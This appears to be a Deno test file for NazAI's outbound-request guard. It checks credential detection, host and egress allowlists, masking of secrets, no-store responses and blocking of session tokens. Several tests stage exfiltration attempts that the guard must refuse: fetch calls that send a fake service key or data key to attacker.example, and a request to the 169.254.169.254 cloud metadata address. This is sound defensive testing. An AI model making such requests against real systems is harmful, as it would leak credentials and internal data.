import {
  CREDENTIAL_SHAPES, OutboundBlocked, allowedHostsFor, findLeak, guardFetch, hostAllowed, maskOutbound, maskOutboundText, maskedJson, noStoreServe, secretsFrom, withNoStore, carriesSessionToken, findSessionToken,
} from "./outbound-guard.ts";
import { REDACTED, SECRET_SHAPES } from "./redact-secrets.ts";
import { approveCustomerOrigin, egressDecision, forgetCustomerApprovals, isNazaiHost, CUSTOMER_APPROVAL_MS } from "./egress.ts";
import { maskUrlQueries, maskUrlQueriesDeep } from "./redact-secrets.ts";
function assert(c: unknown, m = "assertion failed"): asserts c { if (!c) throw new Error(m); }
function assertEquals<T>(a: T, b: T, m?: string) { if (JSON.stringify(a) !== JSON.stringify(b)) throw new Error(m ?? `expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`); }

const SERVICE = "svc_" + "s".repeat(40);
const DATA = "data-key-" + "d".repeat(40);
const SLACK_SECRET = "slack-secret-" + "x".repeat(30);
const ENV = {
  SUPABASE_URL: "https://proj.supabase.co",
  SUPABASE_SERVICE_ROLE_KEY: SERVICE,
  SUPABASE_ANON_KEY: "anon-" + "a".repeat(40),
  DATA_KEY: DATA,
  SLACK_CLIENT_SECRET: SLACK_SECRET,
  SLACK_CLIENT_ID: "1234567890.1234567890",
  SUPABASE_DB_URL: "postgresql://postgres:" + "p".repeat(24) + "@db.proj.supabase.co:5432/postgres",
  SHORT_TOKEN: "abc",
  HOME: "/root",
};
const SECRETS = secretsFrom(ENV);
const OWN = "proj.supabase.co";

Deno.test("secretsFrom: names that say secret, long values; the public anon key and ids are not secrets", () => {
  assertEquals(SECRETS.map((s) => s.name).sort(), ["DATA_KEY", "SLACK_CLIENT_SECRET", "SUPABASE_DB_URL", "SUPABASE_SERVICE_ROLE_KEY"]);
  assertEquals(allowedHostsFor("SLACK_CLIENT_SECRET"), ["slack.com"]);
  assertEquals(allowedHostsFor("SUPABASE_SERVICE_ROLE_KEY"), []);
  assertEquals(allowedHostsFor("GOOGLE_OAUTH_CLIENT_SECRET"), ["googleapis.com", "google.com"]);
});

Deno.test("hostAllowed: own project, the service's own domain and its subdomains, nothing that only looks alike", () => {
  assert(hostAllowed("proj.supabase.co", [], OWN));
  assert(hostAllowed("slack.com", ["slack.com"], OWN));
  assert(hostAllowed("api.slack.com", ["slack.com"], OWN));
  assert(!hostAllowed("evilslack.com", ["slack.com"], OWN));
  assert(!hostAllowed("slack.com.evil.io", ["slack.com"], OWN));
  assert(!hostAllowed("other.supabase.co", [], OWN));
});

Deno.test("findLeak: a NazAI credential to a host it does not belong to, in the address, a header or the body", () => {
  const base = { url: "https://hooks.example.com/x", headers: [] as [string, string][], body: null as string | null };
  assertEquals(findLeak(base, SECRETS, OWN), null);
  assertEquals(findLeak({ ...base, body: `{"note":"${SERVICE}"}` }, SECRETS, OWN)?.name, "SUPABASE_SERVICE_ROLE_KEY");
  assertEquals(findLeak({ ...base, headers: [["authorization", `Bearer ${SERVICE}`]] }, SECRETS, OWN)?.where, "header");
  assertEquals(findLeak({ ...base, url: `https://hooks.example.com/x?k=${encodeURIComponent(DATA)}` }, SECRETS, OWN)?.where, "address");
  assertEquals(findLeak({ ...base, body: `client_secret=${SLACK_SECRET}` }, SECRETS, OWN)?.name, "SLACK_CLIENT_SECRET");
  // allowed: its own service, and NazAI's own project
  assertEquals(findLeak({ url: "https://slack.com/api/oauth.v2.access", headers: [], body: `client_secret=${SLACK_SECRET}` }, SECRETS, OWN), null);
  assertEquals(findLeak({ url: "https://proj.supabase.co/functions/v1/agent-runtime", headers: [["authorization", `Bearer ${SERVICE}`]], body: null }, SECRETS, OWN), null);
  // but the service key never goes to slack
  assertEquals(findLeak({ url: "https://slack.com/api/chat.postMessage", headers: [], body: `text=${SERVICE}` }, SECRETS, OWN)?.name, "SUPABASE_SERVICE_ROLE_KEY");
});

Deno.test("guardFetch: refuses before sending; lets everything else through unchanged", async () => {
  const sent: string[] = [];
  const original = ((input: RequestInfo | URL) => { sent.push(String(input instanceof Request ? input.url : input)); return Promise.resolve(new Response("ok")); }) as typeof fetch;
  const guarded = guardFetch(original, () => ({ secrets: SECRETS, ownHost: OWN }));
  let blocked: unknown = null;
  try { await guarded("https://attacker.example/collect", { method: "POST", body: JSON.stringify({ k: SERVICE }) }); } catch (e) { blocked = e; }
  assert(blocked instanceof OutboundBlocked, "refused");
  assert(!String((blocked as Error).message).includes(SERVICE), "the message never contains the value");
  assertEquals(sent, []);
  // a Request object's body is checked too
  blocked = null;
  try { await guarded(new Request("https://attacker.example/c", { method: "POST", body: `x=${DATA}` })); } catch (e) { blocked = e; }
  assert(blocked instanceof OutboundBlocked, "Request body refused");
  // headers given as an object
  blocked = null;
  try { await guarded("https://attacker.example/c", { headers: { "x-key": DATA } }); } catch (e) { blocked = e; }
  assert(blocked instanceof OutboundBlocked, "header refused");
  // normal traffic (a customer address once it has been checked)
  approveCustomerOrigin("https://api.example.com/hook");
  assertEquals(await (await guarded("https://api.example.com/v1", { method: "POST", body: '{"hello":"world"}' })).text(), "ok");
  assertEquals(await (await guarded("https://proj.supabase.co/rest/v1/x", { headers: { apikey: SERVICE } })).text(), "ok");
  assertEquals(await (await guarded("https://slack.com/api/oauth.v2.access", { method: "POST", body: new URLSearchParams({ client_secret: SLACK_SECRET }) })).text(), "ok");
  assertEquals(sent.length, 3);
});

Deno.test("CREDENTIAL_SHAPES: the secrets rule's formats without plain JWTs (NazAI's own file links carry one)", () => {
  assert(CREDENTIAL_SHAPES.source !== SECRET_SHAPES.source, "the JWT alternative was removed");
  const jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijk";
  assert(new RegExp(SECRET_SHAPES.source).test(jwt) && !new RegExp(CREDENTIAL_SHAPES.source).test(jwt));
  for (const k of ["sk-" + "A".repeat(20), "sk-ant-" + "b".repeat(24), "xoxb-123456789012-abcdef", "ghp_" + "c".repeat(24), "AKIA" + "D".repeat(16), "re_" + "e".repeat(24), "ntn_" + "f".repeat(32), "-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----"]) {
    assert(new RegExp(CREDENTIAL_SHAPES.source).test(k), k.slice(0, 12));
  }
});

Deno.test("maskOutboundText: provider credentials, NazAI's own and the tool's key go; JWT links, ordinary text and short values stay", () => {
  const link = "https://proj.supabase.co/storage/v1/object/sign/f.png?token=eyJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJmIn0.sig_sig_sig";
  const toolKey = "tool-key-123456";
  const r = maskOutboundText(`use sk-${"Z".repeat(24)} and ${SERVICE} and ${toolKey}; file: ${link}; password: hunter2; code=1234`, [toolKey, "ab"], SECRETS);
  assertEquals(r.masked, 3);
  assert(!r.text.includes("sk-ZZ") && !r.text.includes(SERVICE) && !r.text.includes(toolKey));
  assert(r.text.includes(link) && r.text.includes("password: hunter2") && r.text.includes("code=1234"), r.text);
  assertEquals(maskOutboundText("nothing secret here", [], SECRETS), { text: "nothing secret here", masked: 0 });
});

Deno.test("maskOutbound / maskedJson: every string in a nested value, keys and other values kept", () => {
  const v = { a: [`x ${DATA}`, 5, { b: "xoxb-123456789012-abcdef" }], [`k`]: true, n: null };
  const r = maskOutbound(v, [], SECRETS);
  assertEquals(r.masked, 2);
  assertEquals(r.value, { a: [`x ${REDACTED}`, 5, { b: REDACTED }], k: true, n: null });
  assertEquals(v.a[0], `x ${DATA}`, "the original is not changed");
  assertEquals(JSON.parse(maskedJson({ t: "ghp_" + "c".repeat(24) })).t, REDACTED);
});

Deno.test("maskOutbound: an embedded file (data: URL, base64) is passed through untouched", () => {
  const img = "data:image/png;base64," + "AIza" + "B".repeat(40) + "==";
  const r = maskOutbound({ image_url: { url: img }, text: "AIza" + "C".repeat(35) }, [], SECRETS);
  assertEquals(r.value.image_url.url, img);
  assertEquals(r.value.text, REDACTED);
  assertEquals(r.masked, 1);
});

// ---- Data in transit (security task 2): the egress allowlist ----

const own = "proj.supabase.co";

Deno.test("egress: NazAI's own project and listed services pass; anything else needs a checked customer address", () => {
  forgetCustomerApprovals();
  assertEquals(egressDecision("https://proj.supabase.co/rest/v1/x", own), { ok: true, kind: "own" });
  assertEquals(egressDecision("https://api.openai.com/v1/chat/completions", own), { ok: true, kind: "nazai" });
  assertEquals(egressDecision("https://acme.myshopify.com/admin/api/2024-10/shop.json", own), { ok: true, kind: "nazai" });
  assert(isNazaiHost("gmail.googleapis.com") && !isNazaiHost("googleapis.com.evil.io") && !isNazaiHost("notgoogle.com"), "suffix match on a dot boundary only");
  const unchecked = egressDecision("https://hooks.acme.io/in", own);
  assert(!unchecked.ok && unchecked.reason.includes("validateOutboundUrl"), "an unchecked customer address is refused");
  approveCustomerOrigin("https://hooks.acme.io/in");
  assertEquals(egressDecision("https://hooks.acme.io/other/path", own), { ok: true, kind: "customer" }, "the origin is approved, any path");
  assert(!egressDecision("https://hooks.acme.io:8443/in", own).ok, "another port is another origin");
  assert(!egressDecision("https://hooks.acme.io/in", own, false, Date.now() + CUSTOMER_APPROVAL_MS + 1).ok, "the approval expires");
});

Deno.test("egress: no plain http (not even to a listed service), no credentials in the address, data: is not a request", () => {
  forgetCustomerApprovals();
  approveCustomerOrigin("https://hooks.acme.io/in");
  for (const u of ["http://api.openai.com/v1", "http://hooks.acme.io/in", "ftp://hooks.acme.io/x", "http://proj.supabase.co/rest/v1/x", "https://user:pw@api.openai.com/", "https://hooks.acme.io/in?token=abc", "not a url"]) {
    assert(!egressDecision(u, own).ok, u);
  }
  assertEquals(egressDecision("http://kong:8000/rest/v1/x", "kong", true), { ok: true, kind: "own" }, "local development: SUPABASE_URL is http");
  assertEquals(egressDecision("data:image/png;base64,AAAA", own), { ok: true, kind: "local" });
  approveCustomerOrigin("http://insecure.acme.io/in");
  assert(!egressDecision("http://insecure.acme.io/in", own).ok, "an http origin is never approved");
});

Deno.test("guardFetch: refuses a destination outside the allowlist before sending; a customer request does not follow redirects", async () => {
  forgetCustomerApprovals();
  const sent: { url: string; redirect?: RequestRedirect }[] = [];
  const original = ((input: RequestInfo | URL, init?: RequestInit) => { sent.push({ url: String(input instanceof Request ? input.url : input), redirect: init?.redirect }); return Promise.resolve(new Response("ok")); }) as typeof fetch;
  const guarded = guardFetch(original, () => ({ secrets: SECRETS, ownHost: OWN }));
  for (const u of ["https://attacker.example/x", "http://api.openai.com/v1", "http://169.254.169.254/latest/meta-data"]) {
    let blocked: unknown = null;
    try { await guarded(u); } catch (e) { blocked = e; }
    assert(blocked instanceof OutboundBlocked, u);
  }
  assertEquals(sent, [], "nothing was sent");
  approveCustomerOrigin("https://hooks.acme.io/in");
  await guarded("https://hooks.acme.io/in", { method: "POST", body: "{}" });
  await guarded("https://hooks.acme.io/in", { redirect: "error" });
  await guarded("https://api.openai.com/v1/models");
  assertEquals(sent.map((x) => x.redirect), ["manual", "error", undefined], "customer: manual unless stricter; NazAI services unchanged");
});

Deno.test("query strings are masked in logs, errors and evidence: names stay, values go", () => {
  assertEquals(maskUrlQueries("GET https://api.acme.io/v1/search?q=ann@example.com&page=2 failed"), "GET https://api.acme.io/v1/search?q=…&page=… failed");
  assertEquals(maskUrlQueries("see https://x.io/cb#access_token=abc&state=1"), "see https://x.io/cb#access_token=…&state=…");
  assertEquals(maskUrlQueries("https://x.io/path/only and plain text?with=question"), "https://x.io/path/only and plain text?with=question", "only web addresses");
  const deep = maskUrlQueriesDeep({ hook: "https://h.io/in?sig=1", n: 3, list: ["https://a.io/?e=x"], err: new Error("fetch https://b.io/?k=v") });
  assertEquals([deep.hook, deep.n, deep.list[0], deep.err.message], ["https://h.io/in?sig=…", 3, "https://a.io/?e=…", "fetch https://b.io/?k=…"]);
});

Deno.test("responses are never cached: no-store is added, a weaker value replaced, a redirect copied; every Deno.serve form is wrapped", async () => {
  assertEquals(withNoStore(new Response("{}")).headers.get("cache-control"), "no-store");
  assertEquals(withNoStore(new Response("x", { headers: { "Cache-Control": "no-cache" } })).headers.get("cache-control"), "no-store");
  assertEquals(withNoStore(new Response("x", { headers: { "Cache-Control": "private, no-store" } })).headers.get("cache-control"), "private, no-store");
  const r = withNoStore(Response.redirect("https://nazai.net/done", 302));
  assertEquals([r.status, r.headers.get("location"), r.headers.get("cache-control")], [302, "https://nazai.net/done", "no-store"]);
  const calls: unknown[][] = [];
  const serve = noStoreServe((...a: unknown[]) => { calls.push(a); return null; });
  const h = () => new Response("hi");
  serve(h); serve({ port: 1 }, h); serve({ port: 2, handler: h });
  const handlers = [calls[0][0], calls[1][1], (calls[2][0] as { handler: unknown }).handler] as ((r: Request, i: unknown) => Promise<Response>)[];
  for (const fn of handlers) assertEquals((await fn(new Request("https://x.test/"), {})).headers.get("cache-control"), "no-store");
  assertEquals((calls[1][0] as { port: number }).port, 1, "options are passed on");
});

// ---- Cross-platform boundary (security task 3): a NazAI sign-in token never reaches an outside host ----

const b64u = (o: unknown) => btoa(JSON.stringify(o)).replace(/=+$/, "").replace(/\+/g, "-").replace(/\//g, "_");
const jwt = (claims: Record<string, unknown>) => `${b64u({ alg: "HS256", typ: "JWT" })}.${b64u(claims)}.c2lnbmF0dXJlLXNpZw`;
const USER_JWT = jwt({ iss: "https://proj.supabase.co/auth/v1", sub: "u-1", role: "authenticated", session_id: "s-1", aal: "aal1" });
const SERVICE_JWT = jwt({ iss: "supabase", role: "service_role" });
const ANON_JWT = jwt({ iss: "supabase", role: "anon" });
const FILE_LINK_JWT = jwt({ url: "website-images/a/b.png", iat: 1, exp: 2 });

Deno.test("carriesSessionToken: sign-in and privileged tokens are found; file links and the public anon key are not", () => {
  assert(carriesSessionToken(`Authorization: Bearer ${USER_JWT}`));
  assert(carriesSessionToken(`x ${SERVICE_JWT} y`));
  assert(carriesSessionToken(jwt({ session_id: "s-9" })), "a session id alone is enough");
  assert(!carriesSessionToken(`https://proj.supabase.co/storage/v1/object/sign/f.png?token=${FILE_LINK_JWT}`), "a file link is meant to be shared");
  assert(!carriesSessionToken(ANON_JWT), "the anon key is public by design");
  assert(!carriesSessionToken("eyJnotatoken.eyJstillnot.abcd") && !carriesSessionToken("plain text"), "not a token we issue");
});

Deno.test("findSessionToken: address, header or body to any host but NazAI's own project", () => {
  const to = (host: string, extra: Partial<{ url: string; headers: [string, string][]; body: string | null }> = {}) =>
    ({ url: `https://${host}/x`, headers: [] as [string, string][], body: null as string | null, ...extra });
  assertEquals(findSessionToken(to("hooks.acme.io", { headers: [["authorization", `Bearer ${USER_JWT}`]] }), OWN)?.where, "header");
  assertEquals(findSessionToken(to("hooks.acme.io", { body: JSON.stringify({ t: SERVICE_JWT }) }), OWN)?.where, "body");
  assertEquals(findSessionToken(to("hooks.acme.io", { url: `https://hooks.acme.io/cb?t=${encodeURIComponent(USER_JWT)}` }), OWN)?.where, "address");
  assertEquals(findSessionToken(to(OWN, { headers: [["authorization", `Bearer ${USER_JWT}`]] }), OWN), null, "NazAI's own project is where it belongs");
  assertEquals(findSessionToken(to("hooks.acme.io", { body: FILE_LINK_JWT }), OWN), null);
});

Deno.test("guardFetch: a request carrying a sign-in token is refused before it is sent, and the refusal is recordable", async () => {
  forgetCustomerApprovals();
  approveCustomerOrigin("https://hooks.acme.io/in");
  const sent: string[] = [];
  const original = ((input: RequestInfo | URL) => { sent.push(String(input)); return Promise.resolve(new Response("ok")); }) as typeof fetch;
  const guarded = guardFetch(original, () => ({ secrets: [], ownHost: OWN }));
  for (const call of [
    () => guarded("https://hooks.acme.io/in", { method: "POST", headers: { Authorization: `Bearer ${USER_JWT}` }, body: "{}" }),
    () => guarded("https://api.openai.com/v1/x", { method: "POST", body: JSON.stringify({ token: SERVICE_JWT }) }),
  ]) {
    let blocked: unknown = null;
    try { await call(); } catch (e) { blocked = e; }
    assert(blocked instanceof OutboundBlocked, "refused");
    assert(/SESSION_TOKEN/.test((blocked as Error).message) && !(blocked as Error).message.includes(USER_JWT), "named, never the value");
  }
  assertEquals(sent, []);
  assertEquals(await (await guarded("https://hooks.acme.io/in", { method: "POST", body: FILE_LINK_JWT })).text(), "ok", "a file link passes");
});
